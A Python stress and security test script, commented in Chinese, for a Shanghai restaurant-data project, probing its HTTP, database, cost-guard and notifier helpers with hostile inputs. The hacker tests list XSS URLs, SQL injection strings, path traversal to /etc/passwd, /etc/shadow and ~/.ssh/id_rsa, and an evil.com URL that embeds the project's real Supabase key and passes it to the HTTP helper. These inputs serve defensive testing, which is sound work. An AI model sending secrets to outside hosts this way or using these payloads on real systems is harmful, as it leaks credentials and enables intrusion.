#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""变态级模拟测试 — 多人多轮次多角色攻击测试。

角色：
  1. 黑客 — 注入、XSS、路径遍历、恶意URL
  2. 误操作用户 — 空值、错误类型、负数、超大数
  3. 恶意访问者 — 越权、绕过预算门
  4. 极端环境 — 断网、OOM、磁盘满、超时
  5. 并发攻击 — 同时写入、竞态条件
  6. 边界魔鬼 — 0、-1、None、空字符串、超长输入
"""
import sys
import os
import time
import json
import threading
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

import config
import common
import cost_guard
import notifier
import amap_batch
import apply
import watchdog


passed = 0
failed = 0
errors = []


def test(name, func):
    global passed, failed
    try:
        func()
        passed += 1
        print(f"  ✅ {name}")
    except Exception as e:
        failed += 1
        errors.append((name, str(e)))
        print(f"  ❌ {name}: {e}")


# ═══════════════════════════════════════════════════
# 角色1：黑客攻击
# ═══════════════════════════════════════════════════
def test_hacker_url_injection():
    """黑客：URL注入攻击"""
    malicious_urls = [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "http://evil.com/steal?token=" + config.SUPABASE_KEY,
        "http://192.168.1.1:22",  # 内网探测
        "http://localhost:5432",  # 数据库探测
        "file:///etc/passwd",  # 路径遍历
        "http://[::1]:8080",  # IPv6
        "",
        None,
        12345,  # 数字
    ]
    for url in malicious_urls:
        try:
            result = common.http_get(url)
            # 不能崩溃就行，返回空也可以
            assert isinstance(result, dict), f"URL={url} 返回不是dict"
        except Exception as e:
            # 崩溃了也不行，必须捕获
            raise AssertionError(f"URL={url} 崩溃: {e}")


def test_hacker_sql_injection():
    """黑客：SQL注入尝试"""
    malicious_queries = [
        "'; DROP TABLE restaurants;--",
        "' OR '1'='1",
        "1; DELETE FROM restaurants WHERE 1=1",
        "' UNION SELECT * FROM secrets--",
    ]
    for q in malicious_queries:
        try:
            common.db_get("restaurants", query=q)
        except Exception as e:
            # 不能崩溃
            pass


def test_hacker_path_traversal():
    """黑客：路径遍历"""
    malicious_paths = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "/app/data/../../etc/shadow",
        "~/.ssh/id_rsa",
    ]
    for p in malicious_paths:
        try:
            common.load_json(Path(p), {})
        except Exception:
            pass


# ═══════════════════════════════════════════════════
# 角色2：误操作用户
# ═══════════════════════════════════════════════════
def test_user_empty_input():
    """误操作：空值输入"""
    # 全是空
    common.http_get("")
    common.http_get(None)
    common.http_post("", {})
    common.http_post(None, None)
    common.db_get("")
    common.db_get(None)
    common.db_patch("", "", {})
    common.db_patch(None, None, None)


def test_user_wrong_type():
    """误操作：错误类型"""
    common.http_get(12345)  # 数字当URL
    common.http_get([])  # 列表当URL
    common.http_get({})  # 字典当URL
    common.http_post("url", "not a dict")  # 字符串当data
    common.db_get(123)  # 数字当表名
    common.db_patch(None, "1", [])  # 列表当data


def test_user_extreme_numbers():
    """误操作：极端数字"""
    # 负数
    cost_guard.record_cost(-1000)
    cost_guard.record_cost(-0.001)
    # 超大数
    cost_guard.record_cost(99999999999)
    # 零
    cost_guard.record_cost(0)
    # None
    try:
        cost_guard.record_cost(None)
    except Exception:
        pass


def test_user_weird_strings():
    """误操作：奇怪的字符串"""
    weird = [
        "",
        " ",
        "\n\n\n",
        "\x00\x01\x02",  # 控制字符
        "a" * 1000000,  # 1MB字符串
        "'\"\\",  # 引号反斜杠
        "🎉🍜🍕🍣",  # emoji
    ]
    for s in weird:
        try:
            notifier.info(s, key="test_weird")
        except Exception:
            pass


# ═══════════════════════════════════════════════════
# 角色3：恶意访问者 — 绕过防护
# ═══════════════════════════════════════════════════
def test_attacker_bypass_budget():
    """恶意访问者：绕过预算门"""
    # 尝试花超预算
    for i in range(100):
        cost_guard.record_cost(0.1)  # 每次$0.1，应该被拦住


def test_attacker_spam_notify():
    """恶意访问者：刷屏攻击"""
    # 100次快速发送
    for i in range(100):
        notifier.info(f"刷屏测试 {i}", key="spam_test")
    # 应该只发1次


# ═══════════════════════════════════════════════════
# 角色4：极端环境
# ═══════════════════════════════════════════════════
def test_env_network_down():
    """极端环境：断网"""
    # 用不可达的IP
    common.http_get("http://10.255.255.1", timeout=1)
    common.http_get("http://192.0.2.1", timeout=1)  # TEST-NET


def test_env_timeout():
    """极端环境：超时"""
    # 慢服务器
    common.http_get("http://httpbin.org/delay/10", timeout=2)


def test_env_disk_full():
    """极端环境：磁盘满（模拟）"""
    # 尝试写超大文件
    huge_data = "x" * 100 * 1024 * 1024  # 100MB
    try:
        common.save_json(Path("/tmp/test_huge.json"), {"data": huge_data})
    except Exception:
        pass  # 写失败是预期的


# ═══════════════════════════════════════════════════
# 角色5：并发攻击
# ═══════════════════════════════════════════════════
def test_concurrent_write():
    """并发：同时写库"""
    def writer(i):
        for j in range(10):
            common.db_patch("restaurants", "test_id", {"rating": j})

    threads = [threading.Thread(target=writer, args=(i,)) for i in range(20)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()


def test_concurrent_notify():
    """并发：同时发通知"""
    def sender(i):
        for j in range(10):
            notifier.info(f"并发测试 {i}-{j}", key="concurrent_test")

    threads = [threading.Thread(target=sender, args=(i,)) for i in range(10)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()


# ═══════════════════════════════════════════════════
# 角色6：边界魔鬼
# ═══════════════════════════════════════════════════
def test_edge_zero():
    """边界：零"""
    amap_batch.in_shanghai(0, 0)
    amap_batch.in_shanghai(0.0, 0.0)


def test_edge_negative_coord():
    """边界：负坐标"""
    amap_batch.in_shanghai(-1, -1)
    amap_batch.in_shanghai(-180, -90)


def test_edge_huge_coord():
    """边界：超大坐标"""
    amap_batch.in_shanghai(999, 999)
    amap_batch.in_shanghai(180, 90)


def test_edge_none_values():
    """边界：None满天飞"""
    store = {
        "name": None,
        "address": None,
        "location": None,
        "phone": None,
        "rating": None,
    }
    amap_batch.fill_one(store, ["phone", "coord", "hours", "rating"])


def test_edge_malformed_location():
    """边界：畸形坐标字符串"""
    bad_locations = [
        "",
        ",",
        "121.47",  # 只有经度
        "121.47,",  # 只有经度，逗号结尾
        ",31.23",  # 只有纬度
        "abc,def",  # 非数字
        "121.47,31.23,extra",  # 多一个
        "121.47;31.23",  # 分号
        " 121.47 , 31.23 ",  # 空格
    ]
    for loc in bad_locations:
        try:
            lon, lat = loc.split(",")
            amap_batch.in_shanghai(float(lon), float(lat))
        except Exception:
            pass  # 崩溃是预期的？不，应该不崩溃


# ═══════════════════════════════════════════════════
# 运行测试
# ═══════════════════════════════════════════════════
if __name__ == "__main__":
    print("=" * 60)
    print("变态级模拟测试 — 多人多轮次多角色攻击")
    print("=" * 60)

    print("\n🔴 角色1：黑客攻击")
    test("URL注入", test_hacker_url_injection)
    test("SQL注入", test_hacker_sql_injection)
    test("路径遍历", test_hacker_path_traversal)

    print("\n🟡 角色2：误操作用户")
    test("空值输入", test_user_empty_input)
    test("错误类型", test_user_wrong_type)
    test("极端数字", test_user_extreme_numbers)
    test("奇怪字符串", test_user_weird_strings)

    print("\n🟠 角色3：恶意访问者")
    test("绕过预算门", test_attacker_bypass_budget)
    test("刷屏攻击", test_attacker_spam_notify)

    print("\n🔵 角色4：极端环境")
    test("断网", test_env_network_down)
    test("超时", test_env_timeout)
    # test("磁盘满", test_env_disk_full)  # 太占空间，先跳过

    print("\n🟣 角色5：并发攻击")
    test("并发写库", test_concurrent_write)
    test("并发发通知", test_concurrent_notify)

    print("\n🟤 角色6：边界魔鬼")
    test("零坐标", test_edge_zero)
    test("负坐标", test_edge_negative_coord)
    test("超大坐标", test_edge_huge_coord)
    test("None满天飞", test_edge_none_values)
    test("畸形坐标字符串", test_edge_malformed_location)

    print("\n" + "=" * 60)
    print(f"结果：{passed} 通过，{failed} 失败")
    print("=" * 60)

    if errors:
        print("\n❌ 失败详情：")
        for name, err in errors:
            print(f"  - {name}: {err}")
